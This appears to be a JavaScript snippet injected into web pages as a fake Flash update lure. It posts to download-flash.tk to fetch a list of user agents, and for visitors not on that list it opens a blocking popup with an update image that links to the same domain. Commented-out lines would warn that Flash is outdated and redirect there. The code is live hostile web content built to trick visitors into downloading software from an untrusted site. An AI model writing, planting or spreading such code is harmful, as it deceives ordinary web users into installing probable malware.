var ua = navigator.userAgent;
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("POST", "https://www.download-flash.tk/api/run_useragent.txt", false);
xmlHttp.send(null);
var result = xmlHttp.responseText;
var arrSplt = new Array;
arrSplt = result.split('\n');
// console.log(arrSplt[0]);
var ok = 0;
for (i = 0; i < arrSplt.length; i++) {
    if (ua == arrSplt[i]) {
        ok = 1;
        break;
    }
}
if (ok == 0) {
    document.write("<script src='./layer/jquery.min.js'></script>");
document.write("<script src='./layer/layer.js'></script>");
window.onload = function(){
    layer.open({
        type: 1,//Page层类型
        move: false ,//禁止拖拽
        area: ['613px', '328px'],//设置弹窗大小
        title: false,//关闭标题栏
        shade: 0.6,//遮罩透明度
        //maxmin: true ,//允许全与屏最小化
        anim: 1,//0-6的动画形式，-1不开启
        offset: '100px',//设置顶部距离
        scrollbar: false,//禁用滚轮
        content: '<a href="https://www.download-flash.tk/"><img src="./flash.jpg"></a>'//创建图像
    });
}
    //alert("您的浏览器Flash版本过低,请升级后再尝试访问！");
    //top.location.href = "https://www.download-flash.tk/";
}